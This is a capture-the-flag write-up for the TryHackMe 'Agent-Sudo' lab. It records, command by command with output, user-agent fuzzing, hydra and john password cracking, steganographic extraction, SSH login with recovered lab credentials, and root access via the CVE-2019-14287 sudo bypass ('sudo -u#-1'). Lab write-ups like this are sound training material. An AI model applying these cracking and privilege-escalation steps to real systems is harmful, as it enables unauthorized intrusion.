# Agent-Sudo

**IP:** 10.10.54.124  
**Platform:** THM  
**Difficulty:** Easy  
**OS:** Linux  
**Date:** 04/06/2025

## Reconnaissance

```bash
nmap -sC -sV -T4 10.10.54.124 -oA nmap/Agent-Sudo
```

| Port | Service | Version |
|------|---------|---------|
| 21 | ftp | vsftpd 3.0.3 |
| 22 | ssh | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 80 | http | Apache httpd 2.4.29 |

## Enumeration

The site told me to use a codename as the user-agent to access the site, from "Agent `R`". 
```bash
curl -s http://10.10.54.124/ | sed -E 's/<[^>]*>//g'




        Annoucement




        Dear agents,

        Use your own codename as user-agent to access the site.

        From,
        Agent R



                                 
```

## Exploitation

So I got a list A-Z with python
```bash
python3 -c "import string; print('\n'.join(string.ascii_uppercase))"

A
B
C
D
E
F
G
H
I
J
K
L
M
N
O
P
Q
R
S
T
U
V
W
X
Y
Z
```

I then used Burp Suite's "intruder" tool to brute-force the user-agent codenames and find a `302` redirect with the codename `C` to `/agent_C_attention.php`.
![[Pasted image 20250604211700.png]]
After following the redirect, there was a message that leaked an `Agent J`, the name of `Agent C` as `Chris` and told me that his password is weak.
```bash
echo '';curl --path-as-is -s -k -X $'GET' \
    -H $'Host: 10.10.54.124' -H $'User-Agent: C' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Connection: keep-alive' -H $'Upgrade-Insecure-Requests: 1' -H $'Priority: u=0, i' -H $'Referer: http://10.10.54.124/' \
    $'http://10.10.54.124/agent_C_attention.php' | sed -E 's/<[^>]*>//g'        

Attention chris, 

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! 

From,
Agent R 
```

So I bruteforced `chris`'s FTP password with hydra.
```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.54.124 -vI    

...
[21][ftp] host: 10.10.54.124   login: chris   password: crystal
...
```

Logged in with `chris:crystal` and downloaded all of the files in the directory.
```bash
ftp 10.10.54.124 21 -i

Connected to 10.10.54.124.
220 (vsFTPd 3.0.3)
Name (10.10.54.124:wither): chris
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> mget *

local: To_agentJ.txt remote: To_agentJ.txt
229 Entering Extended Passive Mode (|||49001|)
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
100% |***********************************************************************************************************************************************|   217      672.74 KiB/s    00:00 ETA
226 Transfer complete.
217 bytes received in 00:00 (9.89 KiB/s)
local: cute-alien.jpg remote: cute-alien.jpg
229 Entering Extended Passive Mode (|||11561|)
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
100% |***********************************************************************************************************************************************| 33143        1.25 MiB/s    00:00 ETA
226 Transfer complete.
33143 bytes received in 00:00 (674.60 KiB/s)
local: cutie.png remote: cutie.png
229 Entering Extended Passive Mode (|||53830|)
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
100% |***********************************************************************************************************************************************| 34842        1.36 MiB/s    00:00 ETA
226 Transfer complete.
34842 bytes received in 00:00 (751.49 KiB/s)

ftp> exit
221 Goodbye.
```

The text file `To_agentJ.txt` revealed that `Agent J`'s password is hidden in one of the images.
```bash
cat To_agentJ.txt       
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

I found and extracted a zip file `8702.zip` inside `cutie.png`.
```bash
binwalk cutie.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22

file="cutie.png" && binwalk -e $file &>/dev/null && mv *$file.extracted/* . && rm -rf _$file* 
                                                                                ls
365  365.zlib  8702.zip  cute-alien.jpg  cutie.png  To_agentJ.txt  To_agentR.txt

file 8702.zip 
8702.zip: Zip archive data, made by v6.3 UNIX, extract using at least v5.1, last modified Oct 29 2019 20:29:12, uncompressed size 86, method=AES Encrypted
```

Although when I tried to unip `872.zip`, it said that it was encrypted so it wouldn't give me the file `To_agentR.txt`.
```bash
unzip 8702.zip

Archive:  8702.zip
   skipping: To_agentR.txt           need PK compat. v5.1 (can do v4.6)
```

So I cracked the passphrase to the zip (`alien`) file with zip2john and hydra.
```bash
zip2john 8702.zip > hash

john hash --wordlist=/usr/share/wordlists/rockyou.txt
...
alien            (8702.zip/To_agentR.txt)     
...
```

Then used that to unzip it and read `To_agentR.txt`, which revealed a string.
```bash
7z x -palien 8702.zip &>/dev/null                                                   
                                                                        
cat To_agentR.txt

Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

Which decoded from base64 was `Area51`. 
```bash
echo 'QXJlYTUx' | base64 -d   
Area51         

steghide --extract -sf cute-alien.jpg
Enter passphrase: 
wrote extracted data to "message.txt".
```

Which was the steghide passphrase to the file `cute-alien.jpg`. 
```bash
cat message.txt   
           
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

I SSH'd in as james and found the user flag in `/home/james/user_flag.txt`
```bash
ssh james@10.10.54.124
...

cat user_flag.txt 
```

## Privilege Escalation

`james` could run `/bin/bash` as everyone but `root`.
```bash
sudo -l
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

That combined with the `sudo` version `1.8.21p2` meant that the machine was vulnerable to the `CVE-2019-14287` privilege escalation vulnerability.
```bash
sudo --version

Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2

sudo -u#-1 /bin/bash
root@agent-sudo:~# id
uid=0(root) gid=1000(james) groups=1000(james)
```

root flag was in `/root/root.txt`.
```bash
cat /root/root.txt
```

## References

- [Solved: issue with FTP server (229 Entering Extended Passive Mode (\|\|\|49344\|)) - YouTube](https://youtu.be/i5furEJlySY)
- [mget-prompt-override](https://stackoverflow.com/questions/14836397/mget-prompt-override)
- [sudo 1.8.27 - Security Bypass - Linux local Exploit](https://www.exploit-db.com/exploits/47502)

---

#nmap #user-agent-fuzzing #hydra #binwalk #steghide #zip2john #base64-decode #cve-2019-14287 #thm